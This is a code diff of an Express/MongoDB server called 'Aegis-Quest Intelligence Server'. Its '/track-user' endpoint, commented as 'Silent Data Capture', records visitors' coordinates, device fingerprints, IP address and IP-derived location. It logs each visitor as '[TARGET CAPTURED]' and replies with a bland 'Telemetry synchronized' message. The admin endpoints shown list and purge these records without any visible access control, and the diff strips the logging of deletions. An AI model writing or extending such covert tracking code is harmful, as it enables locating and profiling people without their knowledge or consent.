@@ -11,7 +11,7 @@ const port = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json());
 
-// MongoDB Connection URI
+// MongoDB Connection URI (Using Environment Variable)
 const uri = process.env.MONGODB_URI;
 
 const client = new MongoClient(uri, {
@@ -32,68 +32,56 @@ async function run() {
 
     /**
      * 1. Enhanced Silent Data Capture API
-     * capture korbe: coords, device { os, browser, type, vendor, model, cpu, resolution, etc. }
      */
     app.post('/track-user', async (req, res) => {
-    try {
-        const { coords, device } = req.body;
+        try {
+            const { coords, device } = req.body;
+            
+            let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+            if (ip === '::1' || ip === '127.0.0.1') {
+                ip = "103.147.218.154"; // Fallback for local testing
+            }
 
-        
-        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        
-       
-        if (ip === '::1' || ip === '127.0.0.1') {
-            ip = "103.147.218.154"; 
+            const geo = geoip.lookup(ip);
+
+            const finalData = {
+                coords: coords || { lat: 23.6850, lng: 90.3563 }, 
+                device: {
+                    os: device?.os || "Unknown OS",
+                    osVersion: device?.osVersion || "N/A",
+                    browser: device?.browser || "Unknown Browser",
+                    browserVersion: device?.browserVersion || "N/A",
+                    type: device?.type || "Desktop",
+                    vendor: device?.vendor || "Generic",
+                    model: device?.model || "PC",
+                    cpu: device?.cpu || "N/A",
+                    resolution: device?.resolution || "Unknown"
+                },
+                ip: ip,
+                approximateCity: geo ? geo.city : "Dhaka",
+                approximateCountry: geo ? geo.country : "BD",
+                timezone: geo ? geo.timezone : "Asia/Dhaka",
+                receivedAt: new Date().toISOString(),
+                displayTime: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
+            };
+
+            const result = await logsCollection.insertOne(finalData);
+            console.log(`[TARGET CAPTURED] IP: ${ip} | City: ${finalData.approximateCity}`);
+            
+            res.status(201).send({ 
+                success: true, 
+                id: result.insertedId,
+                message: "Telemetry synchronized successfully." 
+            });
+
+        } catch (error) {
+            console.error("Tracking Error:", error);
+            res.status(500).send({ success: false, message: "Internal server error" });
         }
-
-        // ২. IP based Geolocation lookup
-        const geo = geoip.lookup(ip);
-
-        const finalData = {
-          
-            coords: coords || { lat: 23.6850, lng: 90.3563 }, 
-            
-
-            device: {
-                os: device?.os || "Unknown OS",
-                osVersion: device?.osVersion || "N/A",
-                browser: device?.browser || "Unknown Browser",
-                browserVersion: device?.browserVersion || "N/A",
-                type: device?.type || "Desktop",
-                vendor: device?.vendor || "Generic",
-                model: device?.model || "PC",
-                cpu: device?.cpu || "N/A",
-                resolution: device?.resolution || "Unknown"
-            },
-            
-            ip: ip,
-
-            approximateCity: geo ? geo.city : "Dhaka",
-            approximateCountry: geo ? geo.country : "BD",
-            timezone: geo ? geo.timezone : "Asia/Dhaka",
-            
-            receivedAt: new Date().toISOString(),
-            displayTime: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
-        };
-
-        const result = await logsCollection.insertOne(finalData);
-        
-        console.log(`[TARGET CAPTURED] IP: ${ip} | City: ${finalData.approximateCity} | OS: ${finalData.device.os}`);
-        
-        res.status(201).send({ 
-            success: true, 
-            id: result.insertedId,
-            message: "Telemetry synchronized successfully." 
-        });
-
-    } catch (error) {
-        console.error("Tracking Error:", error);
-        res.status(500).send({ success: false, message: "Internal server error" });
-    }
-});
+    });
 
     /**
-     
+     * 2. Fetch Admin Logs
      */
     app.get('/admin-data', async (req, res) => {
       try {
@@ -114,33 +102,29 @@ async function run() {
           const result = await logsCollection.deleteOne(query);
           
           if (result.deletedCount === 1) {
-              console.log(`[DATA PURGED] ID: ${id}`);
               res.status(200).send({ success: true, message: "Log deleted successfully" });
           } else {
               res.status(404).send({ success: false, message: "Log not found" });
           }
       } catch (error) {
-          console.error("Delete Error:", error);
           res.status(500).send({ success: false, message: "Internal server error" });
       }
     });
 
 
-    // 4. Purge All Logs (Danger Zone)
-app.delete('/admin-data-purge', async (req, res) => {
-    try {
-        const result = await logsCollection.deleteMany({});
-        console.log(`[SYSTEM PURGE] Total Deleted: ${result.deletedCount}`);
-        res.status(200).send({ 
-            success: true, 
-            deletedCount: result.deletedCount,
-            message: "All logs have been cleared successfully." 
-        });
-    } catch (error) {
-        console.error("Purge Error:", error);
-        res.status(500).send({ success: false, message: "Internal server error" });
-    }
-});
+    // 4. Purge All Logs
+    app.delete('/admin-data-purge', async (req, res) => {
+        try {
+            const result = await logsCollection.deleteMany({});
+            res.status(200).send({ 
+                success: true, 
+                deletedCount: result.deletedCount,
+                message: "All logs have been cleared successfully." 
+            });
+        } catch (error) {
+            res.status(500).send({ success: false, message: "Internal server error" });
+        }
+    });
 
     app.get('/', (req, res) => {
       res.send('Aegis-Quest Intelligence Server is Active.');
